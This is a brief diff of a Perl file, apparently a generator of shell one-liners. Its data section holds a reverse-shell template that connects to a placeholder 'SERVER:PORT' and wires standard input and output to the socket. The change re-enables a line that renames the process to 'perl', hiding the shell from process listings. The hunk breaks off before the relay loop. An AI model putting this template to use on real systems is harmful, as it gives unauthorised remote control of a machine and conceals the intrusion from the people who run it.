@@ -76,7 +76,7 @@ sub one_liner {
 1;
 
 __DATA__
-#$0=perl;
+$0=perl;
 $socket = new IO::Socket::INET "SERVER:PORT";
 blocking $_ 0 for @in = (*STDIN, $socket), @out = ($socket, *STDOUT);
 
